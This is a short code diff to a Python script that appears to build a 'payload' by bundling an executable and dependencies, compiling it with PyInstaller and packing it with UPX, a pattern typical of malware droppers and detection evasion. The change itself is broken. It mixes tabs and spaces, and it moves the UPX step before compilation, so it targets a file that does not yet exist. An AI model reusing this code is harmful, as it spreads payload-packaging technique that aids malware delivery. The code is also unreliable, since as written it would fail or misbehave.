@@ -116,8 +116,14 @@ if "-d" in sys.argv:
         print('Reading the resource file...')
         archive = readlines(deps + '.zip')
 
-print('Reading the executable file...')
-executable = readlines(filearg)
+if upx:
+        print('Applying upx...')
+        subprocess.getoutput(f"{upxdir} {os.path.abspath('dist/payload.exe')}")
+	print('Reading the executable file...')
+	executable = readlines(f"{upxdir}/{filearg}")
+else:
+	print('Reading the executable file...')
+	executable = readlines(filearg)
 
 if not "-d" in sys.argv:
 	payload = payload.split("#dependencies")[0]+payload.split("#dependencies")[2]
@@ -142,8 +148,5 @@ with open("payload.py", "w") as pay:
 
 print('Compiling...')
 PyInstaller.__main__.run(['-F', '--clean', '--onefile', 'payload.py'])
-if upx:
-        print('Applying upx...')
-        subprocess.getoutput(f"{upxdir} {os.path.abspath('dist/payload.exe')}")
 
 #haha you expected 'if __name__=="__main__":'
